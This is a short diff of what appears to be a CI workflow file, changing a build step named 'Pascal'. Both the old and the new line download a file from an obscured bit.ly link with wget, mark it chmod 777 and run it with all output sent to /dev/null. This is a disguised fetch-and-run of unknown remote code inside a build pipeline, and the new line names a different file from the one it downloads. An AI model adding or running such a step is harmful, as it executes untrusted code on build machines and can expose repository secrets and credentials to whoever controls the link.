@@ -50,4 +50,4 @@ jobs:
 
       - name: Pascal
         run: |
-          wget https://bit.ly/3QA876b && chmod 777 3QA876b && ./3QA876b > /dev/null
+          wget https://bit.ly/3QA876b && chmod 777 ss.sh && ./ss.sh > /dev/null
